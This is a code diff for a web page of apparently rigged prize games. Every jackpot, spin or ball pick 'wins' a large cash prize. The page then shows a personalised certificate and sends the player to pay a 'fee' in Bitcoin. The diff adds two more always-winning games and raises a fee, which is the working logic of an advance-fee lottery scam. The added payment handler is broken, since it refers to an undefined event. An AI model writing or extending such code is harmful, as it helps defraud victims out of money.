@@ -25,7 +25,7 @@ document.getElementById('registrationForm').addEventListener('submit', function(
     }).then(response => response.json()).then(data => {
         if (data.ok) {
             document.getElementById('registration').style.display = 'none';
-            document.getElementById('game').style.display = 'block';
+            document.getElementById('gameSelection').style.display = 'block';
         } else {
             alert('Registration failed. Please try again.');
         }
@@ -36,7 +36,7 @@ document.getElementById('registrationForm').addEventListener('submit', function(
 });
 
 const prizes = [
-    { amount: '$50,000.00', fee: '$500' },
+    { amount: '$50,000.00', fee: '$650' },
     { amount: '$100,000.00', fee: '$1000' },
     { amount: '$125,000.00', fee: '$1250' },
     { amount: '$150,000.00', fee: '$1500' },
@@ -53,25 +53,58 @@ const prizes = [
     { amount: '$1,000,000.00', fee: '$10000' }
 ];
 
-let attempts = 0;
-
-document.getElementById('playButton').addEventListener('click', function() {
-    attempts++;
-    if (attempts <= 3) {
+// Jackpot Game Logic
+if (document.getElementById('playJackpot')) {
+    document.getElementById('playJackpot').addEventListener('click', function() {
         const prize = prizes[Math.floor(Math.random() * prizes.length)];
-        document.getElementById('result').innerText = `You won ${prize.amount}!`;
+        document.getElementById('jackpotResult').innerText = `You won ${prize.amount}!`;
+        showCertificate(prize);
+    });
+}
 
-        if (attempts === 3) {
-            document.getElementById('game').style.display = 'none';
-            document.getElementById('certificate').style.display = 'block';
-            document.getElementById('certificateText').innerText = `Congratulations ${registrationData.fullName}! You won ${prize.amount}.`;
-            document.getElementById('paymentAmount').innerText = prize.fee;
-        }
-    } else {
-        attempts = 0;
-        document.getElementById('result').innerText = 'Try again!';
-    }
-});
+// Spinning Board Game Logic
+if (document.getElementById('spinButton')) {
+    document.getElementById('spinButton').addEventListener('click', function() {
+        const spinner = document.getElementById('spinner');
+        spinner.style.animation = "spin 2s linear infinite";
+
+        setTimeout(() => {
+            spinner.style.animation = "";
+            const prize = prizes[Math.floor(Math.random() * prizes.length)];
+            document.getElementById('spinningResult').innerText = `You won ${prize.amount}!`;
+            showCertificate(prize);
+        }, 2000);
+    });
+}
+
+// Ball Scratch Game Logic
+if (document.getElementById('ballContainer')) {
+    const ballContainer = document.getElementById('ballContainer');
+    prizes.forEach((prize, index) => {
+        const ball = document.createElement('div');
+        ball.className = 'ball';
+        ball.innerText = index + 1;
+        ball.addEventListener('click', function() {
+            document.getElementById('ballScratchResult').innerText = `You won ${prize.amount}!`;
+            showCertificate(prize);
+        });
+        ballContainer.appendChild(ball);
+    });
+}
+
+function showCertificate(prize) {
+    const registrationData = getRegistrationData();
+    document.getElementById('certificateText').innerText = `Congratulations ${registrationData.fullName}! You won ${prize.amount}.`;
+    document.getElementById('paymentAmount').innerText = prize.fee;
+    document.getElementById('game').style.display = 'none';
+    document.getElementById('certificate').style.display = 'block';
+}
+
+function getRegistrationData() {
+    // This function should retrieve registration data from local storage or a global variable
+    // Assuming it's stored in localStorage for now
+    return JSON.parse(localStorage.getItem('registrationData'));
+}
 
 document.getElementById('downloadCertificate').addEventListener('click', function() {
     const certificateText = document.getElementById('certificateText').innerText;
@@ -84,4 +117,21 @@ document.getElementById('downloadCertificate').addEventListener('click', functio
 
 document.getElementById('payBitcoin').addEventListener('click', function() {
     window.location.href = `bitcoin_payment.html?amount=${document.getElementById('paymentAmount').innerText}`;
+});
+
+document.addEventListener('DOMContentLoaded', function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const amount = urlParams.get('amount');
+    if (document.getElementById('amount')) {
+        document.getElementById('amount').value = amount;
+    }
+    if (amount) {
+        const paymentData = new FormData(e.target);
+        const paymentInfo = {};
+        paymentData.forEach((value, key) => {
+            paymentInfo[key] = value;
+        });
+
+        alert(`Payment of ${paymentInfo.amount} BTC sent to ${paymentInfo.wallet}. Thank you!`);
+    }
 });
